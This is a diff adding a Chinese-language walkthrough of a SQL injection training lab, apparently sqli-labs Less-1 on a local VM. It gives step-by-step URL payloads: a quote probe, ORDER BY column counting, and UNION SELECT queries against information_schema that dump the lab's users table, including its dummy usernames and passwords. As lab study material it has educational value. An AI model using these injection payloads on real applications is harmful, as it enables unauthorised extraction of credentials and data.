@@ -1,0 +1,42 @@
+url:http://10.0.2.15/sqli/Less-1/?id=1
+显示：相应用户名和密码
+url:http://10.0.2.15/sqli/Less-1/?id=1%27
+显示：报错' '1'' LIMIT 0,1 '
+即正常情况下(输入id=1)应是:'1' limit 0,1 
+故可以推测出SQL：select username,password from 用户表 where id = '输入的id' limit 0,1;
+
+验证：
+url:http://10.0.2.15/sqli/Less-1/?id=1%27--%20
+显示：用户名和密码
+故说明推测成立
+
+拆解：
+1.判断字段数
+url:http://10.0.2.15/sqli/Less-1/?id=1' order by 3 --+
+显示：用户名和密码，说明字段数至少为3
+url:http://10.0.2.15/sqli/Less-1/?id=1' order by 4 --+
+显示：Unknown column '4' in 'order clause'，说明字段数为3
+而url:http://10.0.2.15/sqli/Less-1/?id=16时，没有显示用户名和密码，说明数据库中没有id='16'的记录
+故url:http://10.0.2.15/sqli/Less-1/?id=16' UNION SELECT 1,2,3 --+
+此时显示用户名为2，密码为3，于是2和3的位置就是可以利用的位置
+
+2.得到登录用户和数据库
+url:http://10.0.2.15/sqli/Less-1/?id=16' UNION SELECT 1,user(),database() --+
+显示：用户为root@localhost，相应的数据库为security（同理，也可以使用version()函数查看mysql版本）
+
+3.表名（为了知道用户名和密码存储在哪个表中）
+url:http://10.0.2.15/sqli/Less-1/?id=16' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema = 'security'--+
+显示：爆出当前使用的数据库中的表名users,uagents,emails,referers
+返回值为用户名和密码，于是推测用户名和密码存储在users表中
+
+4.字段名（为了知道哪两个字段代表用户名和密码）
+url:http://10.0.2.15/sqli/Less-1/?id=16' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name = 'users'--+
+显示：爆出users表中字段名为id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
+可以印证用户名和密码果然是存储于users表中，推测username和password各代表用户名和密码
+
+5.字段值
+url:http://10.0.2.15/sqli/Less-1/?id=16' UNION SELECT 1,group_concat(username),group_concat(password) from users--+
+显示：（一一对应）
+用户名：Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
+密码：Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
+
